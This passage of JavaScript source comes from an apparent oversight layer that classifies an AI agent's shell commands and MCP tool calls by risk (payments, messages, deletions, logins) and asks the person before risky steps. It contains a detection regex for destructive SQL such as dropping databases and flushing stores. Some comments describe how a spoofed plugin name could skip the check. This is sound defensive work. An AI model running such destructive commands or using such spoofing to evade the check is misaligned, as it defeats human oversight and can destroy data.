  const out = { classes: [], counterparty: null, resource: null, builder: null, builderSteps: 0, otherSteps: false, fileDeletes: 0, dataDeletes: 0, cloudDeletes: 0, sensitive: false, why: [], seen: [], unknownProgram: false, programs: [], written: new Set(), treeChanges: false, newProgram: false, programRunsOther: 0, parts: [], partSeq: 0, currentStep: null, shareTo: [], webReads: [] };
  const local = { ...ctx, cwdUnknown: false, powershell };
  const text = String(command ?? '');
  try {
    classifyInto(text, local, out, 0);
  } catch {
    // A command we cannot read is treated as "other" and held when Aimiru cannot be asked.
    unknownProgram(out, 'a command that could not be read');
  }
  if (out.unknownProgram) {
    // A program Aimiru cannot name may be any web client: an address that takes payments or
    // sends messages anywhere in the command decides the class, whatever the method.
    for (const u of new Set([...urlsIn(text), ...urlsIn(out.seen.join(' '))])) {
      out.counterparty = out.counterparty || counterpartyOf(u);
      if (isPaymentHost(hostOf(u))) {
        out.classes.push('spend');
        out.resource = out.resource || 'money.card';
        out.otherSteps = true;
      } else if (isMessageUrl(u)) {
        out.classes.push('send');
        out.otherSteps = true;
      }
    }
  }
  const link = linkRequestsIn(text, powershell);
  if (link.mentioned) {
    out.classes.push('spend');
    out.resource = out.resource || 'money.card';
    out.why.push('pays with Link (a spend request)');
  }
  // Programs the agent wrote (ADR-0090): with Claude Code's sandbox off, running one is asked
  // about and held when Aimiru cannot be asked, like a program Aimiru does not know; with it on, or
  // once the person allowed that same file in this session, it is local work.
  const programs = out.programs.length ? newProgramsOf(out, local) : [];
  // What the command does besides running programs: the program is named only when that is local
  // work, so a rule about new programs never carries another step along (ADR-0090 review).
  const restClass = strongest(...out.classes);
  // deno run may download what the program imports: "other", as before, once the program is read.
  if (out.programRunsOther) out.classes.push('other');
  let sandbox = false;
  if (programs.length) {
    try {
      sandbox = (typeof local.sandbox === 'function' ? local.sandbox() : local.sandbox) === true;
    } catch {
      sandbox = false;
    }
  }
  if (!sandbox && programs.some((p) => !p.remembered)) {
    out.classes.push('other');
    out.sensitive = true;
    out.newProgram = true;
    out.why.push(`runs ${programs.find((p) => !p.remembered).rel}, a new or changed program`);
  }
  const cls = strongest(...out.classes);
  let resource = out.resource || builderResourceFor(cls, out.builder, out.otherSteps || out.newProgram) || dataDeleteResourceFor(cls, out);
  if (!resource && programs.length && !out.unknownProgram && restClass === 'read') resource = NEW_PROGRAM_RESOURCE;
  // A plain web read names net.get and the first host it reads (ADR-0146); a program the agent
  // wrote, named above, says more.
  const webRead = cls === 'read' && !resource && out.webReads.length > 0;
  if (webRead) resource = WEB_READ_RESOURCE;
  // A program the agent wrote is a part only while it is asked about (sandbox off, not allowed yet).
  const parts = partsOf(out, cls, resource, sandbox ? [] : programs.filter((p) => !p.remembered));
  const result = { class: cls, counterparty: out.counterparty, resource, sensitive: out.sensitive, why: out.why, parts };
  if (webRead) result.counterparty = out.webReads[0];
  // Data leaving names its full host (ADR-0146), only when every step that shares names that same
  // one: two places, or a share Aimiru cannot place, name none, so the person is asked.
  if (cls === 'share' && out.shareTo.length) {
    const hosts = new Set(out.shareTo);
    const sole = out.classes.filter((c) => c === 'share').length === out.shareTo.length && hosts.size === 1 && !hosts.has(null);
    result.counterparty = sole ? out.shareTo[0] : null;
  }
  // A push names the repository it goes to (CN7), only when every step that acts on something is a
  // push and all of them go to one place: a yes for a repository then never covers an email, a
  // payment or another repository, and a host some other step only read is never named. The
  // address the command gives is named as written (all OpenClaw has, starting nothing); the pushes
  // go with the answer, out of sight, for the connector to ask git where each really goes, after
  // git's own address rewriting (newness.mjs namePushTarget).
  const pushes = out.pushes || [];
  const onlyPushes = pushes.length > 0 && out.classes.filter((c) => CONSEQUENTIAL.has(c)).length === pushes.length && (cls === 'send' || cls === 'delete');
  if (onlyPushes) {
    const known = !out.unknownProgram && !pushes.some((p) => p.unknown);
    const targets = new Set(pushes.map((p) => p.target ?? null));
    result.counterparty = known && targets.size === 1 && !targets.has(null) ? pushes[0].target : null;
    if (known) Object.defineProperty(result, 'pushes', { value: pushes.map((p) => ({ ...p })), enumerable: false });
  }
  if (programs.length) {
    result.programs = programs;
    result.sandbox = sandbox;
  }
  if (link.sole) {
    const facts = cartFacts(link.found[0].cart);
    result.checkout = facts.checkout;
    if (facts.counterparty) result.counterparty = facts.counterparty;
    if (facts.amount != null) result.amount = facts.amount;
    if (facts.currency) result.currency = facts.currency;
  }
  return result;
}

// ---------------------------------------------------------------------------
// Tool-name classification (MCP tools, in Claude Code and through the Aimiru MCP proxy)
// ---------------------------------------------------------------------------

export function tokenizeName(name) {
  return String(name ?? '')
    .replace(/([a-z0-9])([A-Z])/g, '$1_$2')
    .replace(/([A-Z]+)([A-Z][a-z])/g, '$1_$2')
    .toLowerCase()
    .split(/[^a-z0-9]+/)
    .filter(Boolean);
}

// How a tool name is read (both in Claude Code, for mcp__ tools, and in the Aimiru MCP proxy):
//  1. A word that is only ever a verb settles the class: "send_message", "pay_invoice", "delete_file".
//     When several match, the stricter class wins (CLASS_ORDER).
//  2. Otherwise, with no reading verb present, a word that can be a verb or a noun settles it,
//     the first one by position: "post_message" -> send, "cancel_order" -> delete, "order_pizza" -> spend.
//  3. Otherwise a writing verb takes its class from the noun: "create_payment" -> spend,
//     "create_event" -> book, "create_page" -> write.
//  4. Otherwise a reading verb means read: "get_order", "list_charges", "check_payment_status".
//  5. Otherwise run/execute style tools are "other", and anything left is "read" (spec §8.1).
// Then: money words turn a send into a spend ("send_payment"); destructive SQL or a classified shell
// command inside the arguments can only make the class stricter; MCP annotations can only make it stricter.

const VERB_ONLY = {
  spend: ['pay', 'purchase', 'buy', 'checkout', 'donate', 'topup', 'withdraw', 'remit', 'prepay'],
  send: ['send', 'publish', 'tweet', 'retweet', 'forward', 'broadcast', 'notify', 'announce', 'dial', 'reply', 'deploy', 'unpublish'],
  share: ['share', 'grant', 'unshare', 'expose', 'publicize'],
  book: ['reserve', 'rsvp', 'reschedule'],
  delete: ['delete', 'remove', 'destroy', 'purge', 'erase', 'wipe', 'trash', 'terminate', 'uninstall', 'unlink', 'revoke', 'unsubscribe', 'deactivate', 'rm', 'del', 'kill', 'evict', 'expunge'],
  login: ['login', 'logon', 'signin', 'authenticate', 'authorize', 'impersonate', 'password', 'passwd', 'credential', 'credentials', 'otp', 'mfa', '2fa', 'passkey'],
};
const VERB_OR_NOUN = {
  spend: ['charge', 'transfer', 'refund', 'order', 'tip', 'subscribe', 'payout', 'bid'],
  send: ['post', 'message', 'comment', 'text', 'sms', 'dm', 'call', 'push', 'release', 'merge', 'email', 'mail', 'ping', 'invite'],
  share: [],
  book: ['book', 'schedule'],
  delete: ['drop', 'cancel', 'archive', 'clear', 'reset', 'truncate', 'void', 'close'],
  login: [],
};
const READ_VERBS = new Set(['get', 'list', 'read', 'search', 'find', 'query', 'fetch', 'describe', 'show', 'view', 'retrieve', 'lookup', 'browse', 'download', 'count', 'inspect', 'status', 'history', 'info', 'summarize', 'preview', 'explain', 'resolve', 'validate', 'check', 'estimate', 'quote', 'compare', 'analyze', 'diff', 'watch', 'poll', 'peek', 'stat', 'ls', 'cat', 'grep', 'whoami', 'me', 'health', 'version', 'help', 'snapshot', 'screenshot', 'navigate', 'scroll', 'hover', 'wait', 'console', 'tabs', 'think', 'thinking', 'recall', 'lookup', 'audit', 'test', 'verify', 'track', 'is', 'has', 'can', 'exists', 'search']);
const WRITE_VERBS = new Set(['create', 'add', 'new', 'make', 'update', 'edit', 'set', 'put', 'insert', 'upsert', 'modify', 'patch', 'save', 'upload', 'write', 'rename', 'move', 'copy', 'commit', 'apply', 'enable', 'disable', 'assign', 'label', 'tag', 'install', 'import', 'append', 'replace', 'change', 'configure', 'register', 'submit', 'place', 'start', 'stop', 'restart', 'trigger', 'approve', 'reject', 'fill', 'type', 'click', 'press', 'drag', 'mark', 'link', 'connect', 'store', 'record', 'generate', 'draft', 'compose', 'duplicate', 'restore', 'resolve_issue', 'transition', 'convert']);
const OTHER_VERBS = new Set(['run', 'execute', 'exec', 'eval', 'evaluate', 'invoke', 'shell', 'bash', 'command', 'script', 'terminal', 'process', 'cmd', 'request', 'http', 'curl', 'spawn', 'code']);
const NOUNS = {
  spend: ['payment', 'payments', 'invoice', 'invoices', 'charge', 'charges', 'transfer', 'transfers', 'payout', 'payouts', 'order', 'orders', 'subscription', 'subscriptions', 'refund', 'refunds', 'transaction', 'transactions', 'purchase', 'purchases', 'donation', 'bill', 'checkout', 'cart', 'money', 'funds', 'tip', 'bid'],
  send: ['message', 'messages', 'email', 'emails', 'mail', 'sms', 'text', 'tweet', 'tweets', 'post', 'posts', 'comment', 'comments', 'reply', 'replies', 'notification', 'notifications', 'chat', 'dm', 'pr', 'pull', 'review', 'newsletter', 'campaign', 'broadcast', 'thread', 'call', 'release', 'announcement'],
  share: ['permission', 'permissions', 'invitation', 'invitations', 'invite', 'access', 'collaborator', 'collaborators', 'member', 'members', 'acl', 'visibility', 'sharing', 'link', 'links'],
  book: ['booking', 'bookings', 'reservation', 'reservations', 'appointment', 'appointments', 'event', 'events', 'meeting', 'meetings', 'ride', 'flight', 'flights', 'hotel', 'table', 'ticket', 'tickets', 'slot', 'rsvp'],
  delete: [],
  login: ['password', 'credential', 'credentials', 'token', 'tokens', 'key', 'keys', 'secret', 'secrets', 'session', 'otp', 'mfa', 'apikey', 'passkey'],
};
const MONEY_WORDS = new Set(['payment', 'payments', 'money', 'funds', 'payout', 'transfer', 'tip', 'donation', 'crypto', 'usdc', 'btc', 'eth', 'sol']);
const CLASS_KEYS = ['spend', 'send', 'share', 'book', 'delete', 'login'];
const SQL_DESTRUCTIVE_ARGS = /\b(drop\s+(database|table|schema|index|view|user|role)|truncate\s+(table\s+)?\w+|delete\s+from|flushall|flushdb|dropdatabase)\b/i;

function strictestIn(words, table) {
  for (const cls of CLASS_KEYS) {
    if (table[cls]?.length && words.some((w) => table[cls].includes(w))) return cls;
  }
  return null;
}

function firstByPosition(words, table) {
  for (const w of words) {
    for (const cls of CLASS_KEYS) if (table[cls]?.includes(w)) return cls;
  }
  return null;
}

function pickAmount(args) {
  if (!args || typeof args !== 'object') return {};
  for (const k of ['amount', 'total', 'price', 'value', 'amount_usd', 'unit_amount']) {
    const v = args[k];
    if (typeof v === 'number' && Number.isFinite(v)) {
      const currency = typeof args.currency === 'string' ? args.currency.toUpperCase() : null;
      return { amount: v, currency };
    }
    if (v && typeof v === 'object' && typeof v.value === 'number') {
      return { amount: v.value, currency: typeof v.currency === 'string' ? v.currency.toUpperCase() : null };
    }
  }
  return {};
}

function pickCounterparty(args) {
  if (!args || typeof args !== 'object') return null;
  for (const k of ['to', 'recipient', 'recipients', 'email', 'phone', 'phone_number', 'channel', 'chat_id', 'payee', 'merchant', 'vendor', 'restaurant', 'domain', 'url', 'website']) {
    const v = args[k];
    if (typeof v === 'string' && v) return ['url', 'website'].includes(k) ? counterpartyOf(v) || truncate(v, 200) : truncate(v, 200);
    if (Array.isArray(v) && v.length && typeof v[0] === 'string') return truncate(v.join(', '), 200);
  }
  return null;
}

function stringsIn(value, out = [], depth = 0) {
  if (depth > 5 || out.length > 50) return out;
  if (typeof value === 'string') out.push(value);
  else if (Array.isArray(value)) value.forEach((v) => stringsIn(v, out, depth + 1));
  else if (value && typeof value === 'object') Object.values(value).forEach((v) => stringsIn(v, out, depth + 1));
  return out;
}

/** Argument names that hold a file or folder a tool acts on (a file server's write_file, move_file, delete). */
const PATH_ARGS = /^(path|paths|file|files|file_?path|file_?paths|file_?name|target|target_?path|destination|dest|source|src|dir|directory|folder|old_?path|new_?path|from|to)$/i;

/** Argument names that say where a tool runs, not what it changes: a folder there holding the maker's settings is not changed by it. */
const RUNS_IN_ARGS = /^(cwd|workdir|work_?dir|working_?dir(ectory)?|root|root_?dir|workspace(_?(dir|folder|root|path))?|project(_?(dir|root|path))?|repo(_?(path|root|dir))?)$/i;

/** How many strings, and how deep, Aimiru reads in a tool's arguments; past that they may name anything. */
const ARG_WALK_LIMITS = Object.freeze({ strings: 5000, depth: 32 });

/**
 * Every string in a tool's arguments, at any depth, with the name it is under, and every key too (a
 * tool may take a map of paths to contents). Null when there are more than Aimiru reads.
 */
function argStrings(value) {
  const found = [];
  const walk = (v, key, depth) => {
    if (depth > ARG_WALK_LIMITS.depth || found.length > ARG_WALK_LIMITS.strings) return false;
    if (typeof v === 'string') {
      found.push({ text: v, key });
      return true;
    }
    if (Array.isArray(v)) return v.every((x) => walk(x, key, depth + 1));
    if (v && typeof v === 'object') {
      return Object.entries(v).every(([k, x]) => {
        found.push({ text: k, key: null });
        return walk(x, k, depth + 1);
      });
    }
    return true;
  };
  return walk(value, null, 0) ? found : null;
}

/**
 * A string in a tool's arguments read as a path, or null: an absolute path, one from home, a Windows
 * path, a file: address, or a relative path with no space in it (text that only mentions a path is
 * not one). Under a name that is not a path's, only a word that looks like a path counts.
 */
function argPath(raw, pathKey, ctx) {
  let w = String(raw).trim();
  if (!w || w.length > 4096 || /[\n\r\0]/.test(w)) return null;
  if (/^file:/i.test(w)) {
    try {
      w = decodeURIComponent(new URL(w).pathname);
    } catch {
      return null;
    }
    if (/^\/[A-Za-z]:[\\/]/.test(w)) w = w.slice(1);
  } else if (/^[a-z][a-z0-9+.-]*:\/\//i.test(w)) return null;
  const rooted = w.startsWith('/') || w.startsWith('~') || /^[A-Za-z]:[\\/]/.test(w) || w.startsWith('\\\\') || /^\$(HOME|\{HOME\})(\/|$)/.test(w);
  if (!rooted && /\s/.test(w)) return null;
  if (!pathKey && !rooted && !/[\\/]/.test(w) && !w.startsWith('.')) return null;
  return resolvePathWord(w, ctx);
}

/**
 * The protected file or folder (isProtectedPath, or a folder holding one) a tool's arguments name, or
 * null (security review, 28 Oct): every string in them, under any name, at any depth, keys and file:
 * addresses too, read as a path when it is one. A folder that holds a protected one counts unless the
 * name says the tool only runs there (cwd, root ...). Arguments too many to read may name anything.
 */
function protectedPathInArgs(args, ctx) {
  if (!args || typeof args !== 'object') return null;
  const strings = argStrings(args);
  if (!strings) return 'the files its arguments name';
  const checked = new Set();
  for (const { text, key } of strings) {
    const pathKey = key !== null && PATH_ARGS.test(key);
    const p = argPath(text, pathKey, ctx);
    if (!p) continue;
    const holdsCounts = pathKey || ((key === null || !RUNS_IN_ARGS.test(key)) && !/^\.{1,2}[\\/]?$/.test(String(text).trim()));
    const id = `${holdsCounts ? 'on' : 'in'}:${p}`;
    if (checked.has(id)) continue;
    checked.add(id);
    if (isProtectedPath(p, ctx) || (holdsCounts && holdsProtectedPath(p, ctx))) return p;
  }
  return null;
}

/**
 * Classifies a tool by its server and tool names, its arguments and its MCP annotations.
 * @returns {{class: string, counterparty: string|null, resource: string|null, amount?: number, currency?: string, sensitive: boolean}}
 */
export function classifyToolName({ server = '', tool = '', args = null, annotations = null, pathContext = null } = {}) {
  const words = tokenizeName(tool);
  const serverWords = tokenizeName(server);
  const hasRead = words.some((w) => READ_VERBS.has(w));
  const hasWrite = words.some((w) => WRITE_VERBS.has(w));
  let cls = strictestIn(words, VERB_ONLY);
  if (!cls && !hasRead) cls = firstByPosition(words, VERB_OR_NOUN);
  if (!cls && hasWrite) cls = firstByPosition(words, NOUNS) || 'write';
  if (!cls && hasRead) cls = 'read';
  if (!cls && words.some((w) => OTHER_VERBS.has(w))) cls = 'other';
  if (!cls) cls = firstByPosition(words, NOUNS) || 'read';
  if (cls === 'send' && words.some((w) => MONEY_WORDS.has(w))) cls = 'spend';

  let sensitive = false;
  let counterparty = pickCounterparty(args);
  let commandBuilder = null;
  let commandRead = false;
  let cloudRequest = false;
  if (args && typeof args === 'object') {
    const texts = stringsIn(args);
    if (texts.some((t) => SQL_DESTRUCTIVE_ARGS.test(t))) cls = strongest(cls, 'delete');
    const commandText = ['command', 'cmd', 'script', 'shell_command'].map((k) => args[k]).find((v) => typeof v === 'string');
    if (commandText && words.some((w) => OTHER_VERBS.has(w) || w === 'terminal')) {
      const c = classifyCommand(commandText, pathContext || makePathContext());
      cls = strongest(cls, c.class);
      sensitive = sensitive || c.sensitive;
      counterparty = counterparty || c.counterparty;
      // The command was read step by step: its builder step, a deletion of files or cloud data, or
      // a program the agent wrote (ADR-0088, ADR-0090), if any, is the one it names.
      commandBuilder = [...BUILDER_RANK, FILE_DELETE_RESOURCE, CLOUD_DELETE_RESOURCE, NEW_PROGRAM_RESOURCE].includes(c.resource) ? c.resource : null;
      commandRead = true;
    }
    const url = typeof args.url === 'string' ? args.url : null;
    const method = typeof args.method === 'string' ? args.method.toUpperCase() : 'GET';
    if (url && method !== 'GET') {
      if (isPaymentHost(hostOf(url))) cls = strongest(cls, 'spend');
      else if (isMessageUrl(url)) cls = strongest(cls, 'send');
      else if (method === 'DELETE') {
        // A DELETE request is a deletion, as curl -X DELETE is; to a cloud provider, of cloud data (ADR-0090).
        cls = strongest(cls, 'delete');
        cloudRequest = isCloudHost(hostOf(url));
      }
    }
  }
  // Checkout asks Aimiru (ADR-0065): a store's complete_checkout places the order (UCP, Shopify),
  // and a browser tool that runs a page's own complete_checkout tool does the same. Both are
  // payments with a cart; the connector fills the cart in from the store's earlier answers.
  let checkout = null;
  if (ucpOperation(tool) === 'complete') {
    cls = 'spend';
    const reference = cleanId(args && typeof args === 'object' ? args.id : null);
    checkout = { protocol: ucpProtocol({ server, checkoutId: args?.id ?? null }), items: [], amounts: [], ...(reference ? { reference } : {}) };
  }
  if (args && typeof args === 'object' && pageCheckoutIn(args)) {
    cls = strongest(cls, 'spend');
    checkout = checkout || { protocol: 'browser', items: [], amounts: [] };
  }
  // Annotations come from the tool server: they may only make the class stricter.
  if (annotations && typeof annotations === 'object' && annotations.destructiveHint === true && ['read', 'write', 'other'].includes(cls)) {
    cls = 'delete';
  }
  // A tool that changes the maker's settings or Aimiru's own files (the protected-paths row): a
  // change to them, named as a git guard's removal is and held. Reading them stays a read.
  const settingsPath = cls !== 'read' ? protectedPathInArgs(args, pathContext || makePathContext()) : null;
  if (settingsPath) {
    if (['write', 'other', 'delete'].includes(cls)) cls = 'delete';
    sensitive = true;
  }

  const result = { class: cls, counterparty, resource: null, sensitive };
  if (checkout) result.checkout = checkout;
  // A checkout's amount is the store's cart, never a number in the agent's own arguments: without
  // a cart Aimiru saw, the payment has no amount, so the person is asked.
  const { amount, currency } = checkout ? {} : pickAmount(args);
  if (amount != null) {
    result.amount = amount;
    if (currency) result.currency = currency;
  }
  if (cls === 'spend') result.resource = 'money.card';
  if (cls === 'send') {
    const all = [...words, ...serverWords];
    if (all.some((w) => ['email', 'emails', 'mail', 'gmail', 'outlook', 'smtp'].includes(w))) result.resource = 'message.email';
    else if (all.some((w) => ['sms', 'text', 'whatsapp', 'imessage', 'twilio', 'phone', 'call', 'dial', 'signal'].includes(w))) result.resource = 'message.phone';
  }
  if (cls === 'share') {
    const personal = personalResourceOf(words, args);
    if (personal) result.resource = personal;
  }
  // A deploy, a package, a force push or a dropped table (ADR-0039), only when nothing else is
  // named: the arguments are the agent's, and words in them never move a payment, an email or a
  // personal detail out from under the rules and grants that name it.
  if (!result.resource) {
    const named = commandRead ? commandBuilder : builderOfTool(words, args);
    // A program run as local work (class read) still names itself, as in Claude Code.
    result.resource = named === NEW_PROGRAM_RESOURCE && cls === 'read' ? named : builderResourceFor(cls, named);
  }
  // A cloud provider's tool server deleting something, or a DELETE request to a cloud provider:
  // cloud data (ADR-0090), when nothing else is named.
  if (!result.resource && cls === 'delete' && !commandRead && (cloudRequest || [...words, ...serverWords].some((w) => CLOUD_TOOL_WORDS.has(w)))) {
    result.resource = CLOUD_DELETE_RESOURCE;
  }
  if (settingsPath && cls === 'delete') result.resource = INCIDENT_RESOURCES.removeGuard;
  return result;
}

const PACKAGE_WORDS = ['package', 'packages', 'npm', 'pypi', 'crate', 'crates', 'gem', 'gems', 'module', 'extension', 'library'];
const DB_WORDS = ['database', 'databases', 'db', 'table', 'tables', 'schema', 'collection'];

/**
 * The builder resource a tool call names (ADR-0039), from its name and arguments only: deploy_site
 * and create_deployment deploy; publish_package publishes; git_push with force overwrites the shared
 * copy; drop_table, delete_database and SQL that drops or empties a table drop a database.
 */
/** Words that name a cloud provider or its services in a tool server's or a tool's name (ADR-0090). */
const CLOUD_TOOL_WORDS = new Set([
  'aws', 'amazon', 's3', 'ec2', 'rds', 'dynamodb', 'gcp', 'gcloud', 'gcs', 'bigquery', 'azure', 'cloudflare', 'r2', 'd1',
  'vercel', 'netlify', 'fly', 'flyio', 'railway', 'render', 'heroku', 'digitalocean', 'supabase', 'neon', 'planetscale',
  'firebase', 'firestore', 'kubernetes', 'k8s', 'kubectl', 'helm', 'terraform', 'pulumi', 'docker', 'upstash', 'turso',
  'mongodb', 'atlas',
]);

function builderOfTool(words, args) {
  const has = (...ws) => ws.some((w) => words.includes(w));
  const obj = args && typeof args === 'object' && !Array.isArray(args) ? args : {};
  const on = (v) => v === true || v === 'true';
  if (has('push') && (has('force') || on(obj.force) || on(obj.force_with_lease) || on(obj.forceWithLease))) {
    return BUILDER_RESOURCES.forcePush;
  }
  if ((has('drop', 'truncate') && has(...DB_WORDS)) || (has('delete', 'reset', 'destroy', 'wipe') && has('database', 'databases', 'db'))) {
    return BUILDER_RESOURCES.dbDrop;
  }
  if (stringsIn(obj).some((t) => SQL_DROP.test(t))) return BUILDER_RESOURCES.dbDrop;
  if (has('deploy', 'redeploy') || (has('create', 'trigger', 'start', 'promote') && has('deployment'))) {
    return BUILDER_RESOURCES.deploy;
  }
  if (has('publish') && has(...PACKAGE_WORDS)) return BUILDER_RESOURCES.publish;
  return null;
}

/**
 * The personal detail a share names, as Aimiru's resource for it (personal.address, personal.phone,
 * personal.card, personal.bank, personal.payment), read from the tool's name and its argument names.
 * Naming it only ever makes the answer stricter: the person's Never rules for those details can
 * match ("Never share my address with someone new"), and an unnamed share is asked about anyway.
 * An email, IP, MAC or web address is not where someone lives.
 */
function personalResourceOf(words, args) {
  const all = [...words];
  if (args && typeof args === 'object' && !Array.isArray(args)) {
    for (const key of Object.keys(args).slice(0, 50)) all.push(...tokenizeName(key));
  }
  const has = (...ws) => ws.some((w) => all.includes(w));
  if (has('address', 'addresses') && !has('email', 'ip', 'mac', 'web', 'url', 'wallet')) return 'personal.address';
  if (has('phone', 'mobile')) return 'personal.phone';
  if (has('card', 'cards')) return 'personal.card';
  if (has('bank', 'iban')) return 'personal.bank';
  if (has('payment')) return 'personal.payment';
  return null;
}

// ---------------------------------------------------------------------------
// Claude Code tool calls
// ---------------------------------------------------------------------------

const MCP_NAME_RE = /^mcp__(.+?)__(.+)$/;

/**
 * Claude Code tools that only read or only touch Claude Code's own session state. The plugin's
 * matcher leaves them out (no check at all); listed here too so a check that reaches them is "read".
 * Keep in step with the negative list in claude-code/hooks/hooks.json.
 */
export const READ_ONLY_BUILTINS = new Set([
  'Read', 'Glob', 'Grep', 'LS', 'NotebookRead', 'TodoWrite', 'TodoRead', 'TaskCreate', 'TaskUpdate', 'TaskGet',
  'TaskList', 'TaskOutput', 'TaskStop', 'BashOutput', 'KillShell', 'KillBash', 'ToolSearch', 'AskUserQuestion',
  'ExitPlanMode', 'EnterPlanMode', 'ListMcpResourcesTool', 'ReadMcpResourceTool', 'ReadMcpResourceDirTool', 'LSP',
  'CronList', 'CronDelete', 'Skill',
]);

export function splitMcpToolName(toolName) {
  const m = MCP_NAME_RE.exec(String(toolName ?? ''));
  if (!m) return null;
  return { server: m[1], tool: m[2] };
}

/** The tools Aimiru's own server offers (CONTRACT.md, "MCP"); get_answer is the eighth (ADR-0035), get_task the ninth (ADR-0060), propose the tenth (ADR-0057), and jobs with steps and Memory add six (ADR-0124, ADR-0125): sixteen. */
export const SAYSO_MCP_TOOLS = Object.freeze(['get_context', 'check', 'get_answer', 'request_approval', 'record', 'report_cant', 'take_task', 'pause_status', 'get_task', 'propose', 'start_job', 'add_step', 'get_job', 'complete_step', 'memory_read', 'memory_propose']);

/**
 * The name Aimiru for Claude Code is installed under (claude-code/.claude-plugin/plugin.json). The
 * published name is final (ADR-0089: a tester never reinstalls for a rename), and it is the
 * product's name since the rename (ADR-0093).
 */
export const SAYSO_PLUGIN_NAME = 'aimiru';

/**
 * The plugin's published name and the name this repository used before it (installs made from a
 * copy of this folder before 23 Oct 2026). Used only where reading both names fails safe: finding
 * the data folder, and the settings guard that refuses turning either one off. Trust is not one
 * of them: isSaysoTool trusts the published name alone (ADR-0089 planned the rename pass to drop
 * the old name there, since any plugin called `sayso` serving these tool names would skip the
 * check). An install still under `sayso` has its own tools checked with Aimiru, which costs a
 * request, not safety, and ADR-0089 already asks those installs to reinstall once.
 */
export const SAYSO_PLUGIN_NAMES = Object.freeze([SAYSO_PLUGIN_NAME, 'sayso']);

/**
 * True only for Aimiru's own tools (SAYSO_MCP_TOOLS) served by a server bundled in the Aimiru plugin itself.
 * Those are not checked with Aimiru (it would ask Aimiru about asking Aimiru).
 *
 * Names are never trusted: anyone can call a server "sayso", and a tool name with "__" in it is
 * just a name. Trust comes from what Claude Code reports about the server (hook input
 * `mcp_server`, Claude Code 2.1.274 or later): its `source` must be "plugin", and its name must
 * be a server of the plugin named "aimiru": "plugin:aimiru:<server>", or "<server>" with the tool
 * named mcp__plugin_aimiru_<server>__.... The plugin's name before the rename, "sayso", is not
 * trusted (ADR-0089, ADR-0093). Without that, or for anything
 * else (tools forwarded through aimiru-mcp-proxy included), the call is checked; checking twice
 * costs a request, not safety.
 * @param {string} toolName  Claude Code's tool name, mcp__<server>__<tool>
 * @param {{name?: string, source?: string}|null} [mcpServer]  the hook input's mcp_server
 */
export function isSaysoTool(toolName, mcpServer = null) {
  const parts = splitMcpToolName(toolName);
  if (!parts || !SAYSO_MCP_TOOLS.includes(parts.tool)) return false;
  if (!mcpServer || typeof mcpServer !== 'object' || mcpServer.source !== 'plugin') return false;
  const name = typeof mcpServer.name === 'string' ? mcpServer.name : '';
  const scoped = /^plugin:([^:]+):(.+)$/.exec(name);
  if (scoped && scoped[1] !== SAYSO_PLUGIN_NAME) return false;
  const serverKey = scoped ? scoped[2] : name;
  if (!serverKey || serverKey.includes(':')) return false;
  // Claude Code names a plugin's server in tool names as plugin_<plugin>_<server>, and the plugin
  // must be Aimiru's under its published name, whether the server's name is scoped or bare.
  const key = serverKey.replace(/[^A-Za-z0-9_-]/g, '_');
  return parts.server === `plugin_${SAYSO_PLUGIN_NAME}_${key}`;
}

/** How Claude names a tool of Aimiru's own server in this plugin: mcp__plugin_aimiru_sayso__<tool>. */
export function saysoToolName(tool, plugin = SAYSO_PLUGIN_NAME, server = 'sayso') {
  return `mcp__plugin_${plugin}_${server}__${tool}`;
}

function rel(p, ctx) {
  const r = path.relative(ctx.project, p);
  return r && !r.startsWith('..') ? r : p;
}

/**
 * Whether a Write, Edit or MultiEdit of a git settings file touches core.hooksPath: the new text
 * names it, the replaced text named it, or a Write takes away a file that named it.
 */
function settingsEditTouchesHooksPath(toolName, ti, p) {
  const texts = [];
  if (toolName === 'Write') {
    texts.push(ti.content);
    if (!namesHooksPath(String(ti.content ?? '')) && fileMentionsHooksPath(p)) return true;
  } else if (toolName === 'MultiEdit') {
    for (const e of Array.isArray(ti.edits) ? ti.edits : []) texts.push(e?.old_string, e?.new_string);
  } else texts.push(ti.old_string, ti.new_string, ti.new_source);
  return texts.some((t) => typeof t === 'string' && namesHooksPath(t));
}

/**
 * Maps one Claude Code tool call (PreToolUse input) to an Aimiru action.
 * @param {object} input  the hook's stdin JSON
 * @param {object} [opts] { projectDir, home, tmpDirs, protectedPaths, sandbox, programAllowed, inspectProgram, evidenceKey }
 *   sandbox: true when Claude Code's sandbox holds this shell command (lib/sandbox.mjs), so a
 *   program the agent wrote runs as local work; programAllowed(path, sha256): the person allowed
 *   that same file in this session (ADR-0090). evidenceKey: the agent key, for the evidence's
 *   input_mac (ADR-0094).
 * @returns {object} action: { class, description, evidence, counterparty?, resource?, amount?, currency?, sensitive? }
 *   For a command that runs programs the agent wrote, the action also has `programs` (not
 *   enumerable, so it is never sent): [{path, rel, sha256, why, hints, remembered}], and `sandbox`.
 *   `neverParts` (not enumerable): the steps of a mixed command that name their own resource, sent
 *   as the check's `parts` (ADR-0096).
 */
export function actionForClaudeCodeTool(input, opts = {}) {
  const toolName = String(input?.tool_name ?? '');
  const ti = input?.tool_input && typeof input.tool_input === 'object' ? input.tool_input : {};
  const ctx = makePathContext({
    projectDir: opts.projectDir || input?.cwd,
    cwd: input?.cwd || opts.projectDir,
    home: opts.home,
    tmpDirs: [input?.scratchpad_dir, ...(opts.tmpDirs || [])].filter(Boolean),
    protectedPaths: opts.protectedPaths || [],
    sandbox: typeof opts.sandbox === 'function' ? opts.sandbox : opts.sandbox === true,
    programAllowed: opts.programAllowed,
    inspectProgram: opts.inspectProgram,
  });
  let programs = null;
  let sandboxOn = false;
  let cls = 'read';
  let description = '';
  let counterparty = null;
  let resource = null;
  let sensitive = false;
  let extra = {};
  let parts = [];
  /** The pushes git looks up the destination of (CN7), for the connector's namePushTarget. */
  let pushes = null;
  // What the evidence quotes: for a command, only what decides what runs (ADR-0094).
  let evidenceInput = ti;

  if (toolName === 'Bash' || toolName === 'PowerShell') {
    const command = String(ti.command ?? '');
    const c = classifyCommand(command, ctx, { powershell: toolName === 'PowerShell' });
    cls = c.class;
    counterparty = c.counterparty;
    resource = c.resource;
    sensitive = c.sensitive;
    parts = c.parts || [];
    pushes = c.pushes || null;
    evidenceInput = shellEvidenceInput(ti);
    description = `Run a command: ${command.replace(/\s+/g, ' ').trim()}`;
    if (c.programs) {
      programs = c.programs;
      sandboxOn = c.sandbox === true;
      if (resource === NEW_PROGRAM_RESOURCE) description = withProgramSentence(description, programDescription(c.programs, c.sandbox));
    }
